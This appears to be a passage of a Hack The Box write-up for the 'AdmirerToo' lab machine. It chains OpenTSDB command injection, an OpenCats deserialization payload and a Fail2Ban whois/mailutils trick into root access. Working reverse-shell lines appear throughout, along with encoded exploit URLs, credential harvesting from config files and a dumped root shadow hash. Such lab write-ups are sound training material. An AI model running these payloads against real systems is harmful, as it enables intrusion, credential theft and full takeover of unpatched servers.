<p>According to <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-18666/product_id-47794/Opentsdb-Opentsdb.html">CVE Details</a> there are 4 vulnerabilities for &quot;OpenTSDB&quot;. Two of them are Code Execution. But we need to find the right version information of running application. To get version information, we can use the below endpoint.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 'http://127.0.0.1:4242/api/version'</code></pre>
</doc-codeblock></div>
<p>After setting the redirector for the version endpoint, capture the login request and modify it a previously and forward it to server.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-json"><code v-pre class="language-json">{&quot;short_revision&quot;:&quot;14ab3ef&quot;,&quot;repo&quot;:&quot;/home/hobbes/OFFICIAL/build&quot;,&quot;host&quot;:&quot;clhbase&quot;,&quot;version&quot;:&quot;2.4.0&quot;,&quot;full_revision&quot;:&quot;14ab3ef8a865816cf920aa69f2e019b7261a7847&quot;,&quot;repo_status&quot;:&quot;MINT&quot;,&quot;user&quot;:&quot;hobbes&quot;,&quot;branch&quot;:&quot;master&quot;,&quot;timestamp&quot;:&quot;1545014415&quot;}</code></pre>
</doc-codeblock></div>
<p>Alright, we got the version information. It is using 2.4.0 and RCE via command injection exists in this version. The POC is already available for this vulnerability <a href="https://github.com/OpenTSDB/opentsdb/issues/2051">here</a>.
Lets modify the POC to send a ping to our machine first:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 'http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:sys.cpu.nice&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=%5B33:system(%27ping+-c+4+10.10.14.3%27)%5D&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json'</code></pre>
</doc-codeblock></div>
<p>After forwarding the request, we’d get this error page. The important part of this is mentioned at the end of the error:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-json"><code v-pre class="language-json">...[snip]...

No such name for 'metrics': 'sys.cpu.nice'\n\tat net.opentsdb.uid.UniqueId$1GetIdCB.call(UniqueId.java:450) ~[tsdb-2.4.0.jar:14ab3ef]\n\tat net.opentsdb.uid.UniqueId$1GetIdCB.call(UniqueId.java:447) ~[tsdb-2.4.0.jar:14ab3ef]\n\t... 34 common frames omitted\n&quot;}</code></pre>
</doc-codeblock></div>
<p>The error is triggered because the <code v-pre>metrics</code> which we used (sys.cpu.nice) is not available, so it couldn’t complete the code execution. Lets find the metrics looking at the <a href="http://opentsdb.net/docs/build/html/api_http/suggest.html">documentation</a>.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 'http://127.0.0.1:4242/api/suggest?type=metrics'</code></pre>
</doc-codeblock></div>
<p>We get a response back:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">[&quot;http.stats.web.hits&quot;]</code></pre>
</doc-codeblock></div>
<p>Let’s modify our redirect link accordingly:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 'http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=%5B33:system(%27ping+-c+4+10.10.14.4%27)%5D&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json'</code></pre>
</doc-codeblock></div>
<p>Success! We get RCE!
<figure class="content-center">
    <img src="images/image5.png" alt="" />
    <figcaption class="caption"></figcaption>
</figure>
</p>
<doc-anchor-target id="rce">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#rce">#</doc-anchor-trigger>
        <span>RCE</span>
    </h3>
</doc-anchor-target>
<p>Ok, now lets get a reverse shell. Make sure to put the payload inside single quotes and urlencode:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash"># ORIGINAL
'/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.4/9001 0&gt;&amp;1&quot;'

# URL ENCODED
%27%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%22%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%34%2f%39%30%30%31%20%30%3e%26%31%22%27</code></pre>
</doc-codeblock></div>
<p>Setup the redirector with our urlencoded command:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 'http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=%5B33:system(%27%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%22%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%34%2f%39%30%30%31%20%30%3e%26%31%22%27)%5D&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json'</code></pre>
</doc-codeblock></div>
<p>Start a netcat listener on port 9001, intercept the database login and modify the parameters to trigger the SSRF -&gt; RCE and we are in:
<img src="images/image6.png" alt="" /></p>
<doc-anchor-target id="shell-as-opentsdb">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#shell-as-opentsdb">#</doc-anchor-trigger>
        <span>Shell as opentsdb</span>
    </h2>
</doc-anchor-target>
<p>From here we can get the <code v-pre>/etc/passwd</code> to check the users in the machine:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">opentsdb@admirertoo:/$ cat /etc/passwd | grep sh$

root:x:0:0:root:/root:/bin/bash
jennifer:x:1002:100::/home/jennifer:/bin/bash</code></pre>
</doc-codeblock></div>
<p>We see there is a user called <code v-pre>jennifer</code>.</p>
<doc-anchor-target id="found-credentials">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#found-credentials">#</doc-anchor-trigger>
        <span>Found credentials</span>
    </h3>
</doc-anchor-target>
<p>Enumerating the machine we find credentials in the plugins directory of adminer:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">opentsdb@admirertoo:/$ cat /var/www/adminer/plugins/data/servers.php     

&lt;?php
return [
  'localhost' =&gt; array(
//    'username' =&gt; 'admirer',
//    'pass'     =&gt; 'bQ3u7^AxzcB7qAsxE3',
// Read-only account for testing
    'username' =&gt; 'admirer_ro',
    'pass'     =&gt; '1w4nn4b3adm1r3d2!',
    'label'    =&gt; 'MySQL',
    'databases' =&gt; array(
      'admirer' =&gt; 'Admirer DB',
    )
  ),
];</code></pre>
</doc-codeblock></div>
<p>After trying some combinations I finally get a successfull SSH login using <code v-pre>jennifer:bQ3u7^AxzcB7qAsxE3</code>:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ ssh jennifer@10.10.11.137
jennifer@10.10.11.137 password: 
Linux admirertoo 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
No mail.
Last login: Tue Feb 22 20:58:38 2022 from 10.10.14.8
jennifer@admirertoo:~$</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="ssh-shell-as-jennifer">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#ssh-shell-as-jennifer">#</doc-anchor-trigger>
        <span>SSH shell as jennifer</span>
    </h2>
</doc-anchor-target>
<p>We can read the <code v-pre>flag.txt</code> in the home directory.
While enumerating the machine we find a webserver running internally on port 8080:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:~$ netstat -antup
Active Internet connections (servers and established)                                                                                                       
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name                                                            
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                                                                           
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                                                                           
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      - 
...[SNIP]...</code></pre>
</doc-codeblock></div>
<p>Running a simple <code v-pre>curl</code> command we can get a grasp of it:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:~$ curl -i localhost:8080                                                                                                               
HTTP/1.1 200 OK                                                                                                                                             
Date: Thu, 24 Mar 2022 08:26:00 GMT                                                                                                                         
Server: Apache/2.4.38 (Debian)                                                                                                                              
Set-Cookie: CATS=kpcm3cfavlvquppb97spq7ovi6; path=/                                                                                                         
Expires: Mon, 26 Jul 1997 05:00:00 GMT                                                                                                                      
Cache-Control: no-store, no-cache, must-revalidate                                                                                                          
Pragma: no-cache                                                                                                                                            
Last-Modified: Thu, 24 Mar 2022 08:26:00 GMT                                                                                                                
Vary: Accept-Encoding                                                                                                                                       
Content-Length: 3665                                                                                                                                        
Content-Type: text/html; charset=UTF-8                                                                                                                      
                                                                                                                                                            
&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;                                                                                              
&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;                                                                                                  
&lt;html&gt;                                                                                                                                                      
&lt;head&gt;                                                                                                                                                      
&lt;title&gt;opencats - Login&lt;/title&gt;
...[SNIP]...</code></pre>
</doc-codeblock></div>
<p>It is running an web application called &quot;OpenCats&quot;.</p>
<doc-anchor-target id="enumerating-services">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#enumerating-services">#</doc-anchor-trigger>
        <span>Enumerating services</span>
    </h3>
</doc-anchor-target>
<p>Enumerating the services running on the machine we see another interesting thing:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:~$ systemctl list-units --type=service
UNIT                               LOAD   ACTIVE SUB     DESCRIPTION                                                       
apache2.service                    loaded active running The Apache HTTP Server                                            
apache2@opencats.service           loaded active running The Apache HTTP Server                                            
apparmor.service                   loaded active exited  Load AppArmor profiles                                            
console-setup.service              loaded active exited  Set console font and keymap                                       
cron.service                       loaded active running Regular background program processing daemon                      
dbus.service                       loaded active running D-Bus System Message Bus                                          
fail2ban.service                   loaded active running Fail2Ban Service
...[SNIP]...</code></pre>
</doc-codeblock></div>
<p>We confirm that &quot;OpenCats&quot; is running (<code v-pre>apache2@opencats.service</code>) but also Fail2Ban (<code v-pre>fail2ban.service</code>).  Lets see what version:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:~$ fail2ban-server -V  
Fail2Ban v0.10.2</code></pre>
</doc-codeblock></div>
<p>This version in particular has a <a href="https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm">RCE vulnerability</a> in mailing action using mailutils.</p>
<doc-anchor-target id="privilege-escalation-to-root">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#privilege-escalation-to-root">#</doc-anchor-trigger>
        <span>Privilege Escalation to Root</span>
    </h2>
</doc-anchor-target>
<p>First lets forward the port 8080 via SSH so we can have a look at the OpenCats website. I will forward port 8080 to my local port 9000:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ ssh -L 9000:127.0.0.1:8080 jennifer@10.10.11.137</code></pre>
</doc-codeblock></div>
<p>Browsing to http://localhost:9000/ we see OpenCats website and version 0.9.5.2:
<figure class="content-center">
    <img src="images/image7.png" alt="" />
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>This version has a deserialization vulnerability, <a href="https://www.cvedetails.com/cve/CVE-2021-25294/">CVE2021-25-294</a>, that can lead to remote command execution. But we need to authenticate in the web application first.</p>
<doc-anchor-target id="opencats-database">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#opencats-database">#</doc-anchor-trigger>
        <span>OpenCats database</span>
    </h3>
</doc-anchor-target>
<p>We can find credentials for the website database looking at <code v-pre>/opt/opencats/config.php</code>:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">/* Database configuration. */                                                                                                                               
define('DATABASE_USER', 'cats');                                                                                                                            
define('DATABASE_PASS', 'adm1r3r0fc4ts');                                                                                                                   
define('DATABASE_HOST', 'localhost');                                                                                                                       
define('DATABASE_NAME', 'cats_dev');</code></pre>
</doc-codeblock></div>
<p>We can now access the database and update the <code v-pre>admin</code> password with our own.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:/opt/opencats$ mysql -u cats -p
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 2926
Server version: 10.3.31-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]&gt; use cats_dev;
Database changed
MariaDB [cats_dev]&gt; select * from user\G                                                           
*************************** 1. row ***************************                                                           
                  user_id: 1                                                                                             
                  site_id: 1                                                                                                                                
                user_name: admin                                                                                                                            
                    email: admin@testdomain.com                                                                                                             
                 password: dfa2a420a4e48de6fe481c90e295fe97                                                                                                 
             access_level: 500                                                                                                                              
      can_change_password: 1                                                                                                                                
             is_test_user: 0                                                                                                                                
                last_name: Administrator
               first_name: CATS
                  is_demo: 0
               categories: NULL
           session_cookie: CATS=lbvars2nn2tk51l4t58nnkc4ut
</code></pre>
</doc-codeblock></div>
<p>Create a password:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ echo -n password123 | md5sum
482c811da5d5b4bc6d497ffa98491e38  -</code></pre>
</doc-codeblock></div>
<p>Update the <code v-pre>admin</code> password in the database:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">MariaDB [cats_dev]&gt; update user set password=&quot;482c811da5d5b4bc6d497ffa98491e38&quot; where user_id=1;
Query OK, 1 row affected (0.002 sec)
Rows matched: 1  Changed: 1  Warnings: 0</code></pre>
</doc-codeblock></div>
<p>Great, now we can login as <code v-pre>admin:password123</code> in the website portal:
<figure class="content-center">
    <img src="images/image8.png" alt="" />
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>There is a <a href="https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html">blog by Snoopy Security</a> that explains how to exploit that CVE, we can read and follow along.</p>
<doc-anchor-target id="exploiting-opencats">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#exploiting-opencats">#</doc-anchor-trigger>
        <span>Exploiting OpenCats</span>
    </h3>
</doc-anchor-target>
<p>For this to work we need to switch to activities tab, click on <code v-pre>date</code> and intercept the request in Burp Suite:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">GET /index.php?m=activity&amp;parametersactivity%3AActivityDataGrid=a%3A8%3A%7Bs%3A10%3A%22rangeStart%22%3Bi%3A0%3Bs%3A10%3A%22maxResults%22%3Bi%3A15%3Bs%3A13%3A%22filterVisible%22%3Bb%3A0%3Bs%3A9%3A%22startDate%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22endDate%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22period%22%3Bs%3A37%3A%22DATE_SUB%28CURDATE%28%29%2C+INTERVAL+1+MONTH%29%22%3Bs%3A6%3A%22sortBy%22%3Bs%3A15%3A%22dateCreatedSort%22%3Bs%3A13%3A%22sortDirection%22%3Bs%3A4%3A%22DESC%22%3B%7D HTTP/1.1
Host: localhost:9000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://localhost:9000/index.php?m=activity&amp;parametersactivity%3AActivityDataGrid=a%3A8%3A%7Bs%3A10%3A%22rangeStart%22%3Bi%3A0%3Bs%3A10%3A%22maxResults%22%3Bi%3A15%3Bs%3A13%3A%22filterVisible%22%3Bb%3A0%3Bs%3A9%3A%22startDate%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22endDate%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22period%22%3Bs%3A37%3A%22DATE_SUB%28CURDATE%28%29%2C+INTERVAL+1+MONTH%29%22%3Bs%3A6%3A%22sortBy%22%3Bs%3A15%3A%22dateCreatedSort%22%3Bs%3A13%3A%22sortDirection%22%3Bs%3A3%3A%22ASC%22%3B%7D
Cookie: CATS=pi6tu18gi6s644ab6doit1ll37
Upgrade-Insecure-Requests: 1</code></pre>
</doc-codeblock></div>
<p>According to the blog, <code v-pre>activity</code> parameter is vulnerable. So, we need to generate serialized exploit using PHPGGC and replace it with default one. We can use <a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a>.
First we can simply create a file in <code v-pre>/dev/shm</code> to check its permissions and user details:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ echo &quot;Caue was here&quot; &gt; test.txt
$ phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/test.txt /home/caue/htb/admirertoo/test.txt
a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A14%3A%22Caue+was+here%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A17%3A%22%2Fdev%2Fshm%2Ftest.txt%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D</code></pre>
</doc-codeblock></div>
<p>Replacing the generated serialized object above with the one in <code v-pre>DataGrid</code> parameter we get the exploit to work. If we look at <code v-pre>/dev/shm/</code> we can see our file:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:/dev/shm$ ls -la
total 4
drwxrwxrwt  2 root  root    60 Mar 24 09:10 .
drwxr-xr-x 16 root  root  3080 Mar 24 06:04 ..
-rw-r--r--  1 devel devel   57 Mar 24 09:10 test.txt
jennifer@admirertoo:/dev/shm$ cat test.txt
Caue was here
jennifer@admirertoo:/dev/shm$</code></pre>
</doc-codeblock></div>
<p>Things to note here is that the file was created by <code v-pre>devel</code> user and not <code v-pre>root</code>. Devel does not have any shell access (see <code v-pre>/etc/passwd</code> below) so it is probably useless to get a shell as him:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:/dev/shm$ grep 'devel' /etc/passwd
devel:x:1003:1003::/home/devel:/sbin/nologin</code></pre>
</doc-codeblock></div>
<p>Dead end.</p>
<doc-anchor-target id="fail2ban-exploit">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#fail2ban-exploit">#</doc-anchor-trigger>
        <span>Fail2ban exploit</span>
    </h3>
</doc-anchor-target>
<p>Going back to Fail2Ban exploit, we can get code execution if we edit the <code v-pre>/etc/hosts</code> file and point to our own IP address. However, we don’t have permission to edit the hosts file, only root can edit it.
But, we can put a whois configuration file in <code v-pre>/usr/local/etc</code> directory and when we execute whois command it takes configuration file for processing.
This is the default configuration of jail (fail2ban), if any IP is banned then it sends an email to specified address.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:/dev/shm$ cat /etc/fail2ban/jail.local  
[DEFAULT]  
ignoreip = 127.0.0.1  
bantime = 60s  
destemail = root@admirertoo.htb  
sender = fail2ban@admirertoo.htb  
sendername = Fail2ban  
mta = mail  
action = %(action_mwl)s</code></pre>
</doc-codeblock></div>
<p>The configuration file below says that Fail2Ban is enabled in SSH:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:/dev/shm$ cat /etc/fail2ban/jail.d/defaults-debian.conf  
[sshd]  
enabled = true</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="root-exploit-chain">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#root-exploit-chain">#</doc-anchor-trigger>
        <span>Root exploit chain</span>
    </h3>
</doc-anchor-target>
<p>We will use OpenCats deserialization vulnerability to write a malicious <code v-pre>whois</code> configuration file that is pointing to our machine. Then we create another file that will send us a reverse shell and it is triggered whenever Fail2Ban sends an email - in another words, when someone tries to SSH login with wrong credentials multiple times.</p>
<p>Step 1 - Create a configuration file:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ cat caue.conf  
}]|. [10.10.14.4]</code></pre>
</doc-codeblock></div>
<p>Step 2 - Serialize the configuration file to overwrite <code v-pre>/usr/local/etc/whois.conf</code>:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf /home/caue/htb/admirertoo/caue.conf
a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A18%3A%22%7D%5D%7C.+%5B10.10.14.4%5D%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D</code></pre>
</doc-codeblock></div>
<p>Step 3 - We create a local shell file that we’ll use to get a reverse shell to our own box:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ cat shell
~| bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.4/9001 0&gt;&amp;1&quot; &amp;</code></pre>
</doc-codeblock></div>
<p>Step 4 - Start a netcat listener on port 43 (whois) &amp; on port 9001 to receive the shell:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ nc -nvlkp 43 -c &quot;cat shell&quot;
---
$ nc -lnvp 9001</code></pre>
</doc-codeblock></div>
<p><figure class="content-center">
    <img src="images/image9.png" alt="" />
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>Step 5 - Now we go to the OpenCats website, click on the vulnerable &quot;Date&quot;, intercept the request and modify the parameter with our generated serialized object of step 2.</p>
<p>Step 6 - Test -&gt; Run whois to our machine:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:/dev/shm$ whois 10.10.14.4</code></pre>
</doc-codeblock></div>
<p>And we get a hit back in our netcat listening on port 43! Nice!
Lets set the netcat for the whois back up again:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ nc -nvlkp 43 -c &quot;cat shell&quot;</code></pre>
</doc-codeblock></div>
<p>Step 7 - Spam the SSH login to get banned and trigger Fail2Ban
At this moment our payload is already delivered to target machine, now we need to trigger Fail2Ban application via failed SSH attempts:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ ssh root@10.10.11.137
root@10.10.11.137's password: 
Permission denied, please try again.
root@10.10.11.137's password: 
Permission denied, please try again.
root@10.10.11.137's password:</code></pre>
</doc-codeblock></div>
<p>And we are ROOT.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">$ nc -lnvp 9001                                                                                                                                             
listening on [any] 9001 ...                                                                                                                                 
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.137] 50568                                                                                                 
bash: cannot set terminal process group (3475): Inappropriate ioctl for device                                                                              
bash: no job control in this shell                                                                                                                          
root@admirertoo:/# cd /root
root@admirertoo:~# ls -la
total 40
drwx------  4 root root 4096 Jan 12 10:20 .
drwxr-xr-x 18 root root 4096 Jan 11 11:20 ..
lrwxrwxrwx  1 root root    9 Jul  8  2021 .bash_history -&gt; /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  2 root root 4096 Dec 16 15:00 .cleanup
drwx------  3 root root 4096 Jan 10 22:49 .gnupg
lrwxrwxrwx  1 root root    9 Jul  8  2021 .mysql_history -&gt; /dev/null
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   33 Mar 24 06:04 root.txt
-rw-------  1 root root 9755 Jan 12 10:20 .viminfo</code></pre>
</doc-codeblock></div>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">root:$6$eP5MVyB1lXtVQgzU$H4xJdGiHfSu9JmUR80juqHC5BAca79yir2Z6bipW8s.DowTuNRo82/CjN7EMBK8lczD1AMYxgKTIp79DjN2R31:18817:0:99999:7:::</code></pre>
</doc-codeblock></div>

                                
                                <!-- Required only on API pages -->
                                <doc-toolbar-member-filter-no-results />
                            </div>
                            <footer class="clear-both">
                            
                                <nav class="flex mt-14">
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/acute/">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                            <span>
                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
                                                <span class="block mt-1">Acute</span>
                                            </span>
                                        </a>
                                    </div>
                            
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/catch/">
                                            <span>
                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
                                                <span class="block mt-1">Catch</span>
                                            </span>
                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                        </a>
                                    </div>
                                </nav>
                            </footer>
                        </main>
                
                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
                            <footer class="flex flex-wrap items-center justify-between">
                                <div>
                                    <ul class="flex flex-wrap items-center text-sm">
                                    </ul>
                                </div>
                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2022. Caue All rights reserved.</p></div>
                            </footer>
                        </div>
                    </div>
                
                    <!-- Rendered if sidebar right is enabled -->
                    <!-- Sidebar right skeleton-->
